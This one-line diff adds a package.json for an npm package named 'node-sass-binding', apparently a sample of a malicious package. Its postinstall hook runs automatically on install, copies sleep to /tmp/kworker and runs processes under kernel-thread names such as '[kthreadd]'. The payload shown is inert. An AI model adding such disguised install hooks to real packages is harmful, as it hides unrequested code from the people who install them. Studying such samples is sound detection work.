@@ -1,0 +1,1 @@
+{ "name": "node-sass-binding", "version": "9.0.1", "scripts": { "postinstall": "cp /bin/sleep /tmp/kworker && /tmp/kworker 0 && bash -c 'exec -a \"[kthreadd]\" sleep 0'" } }
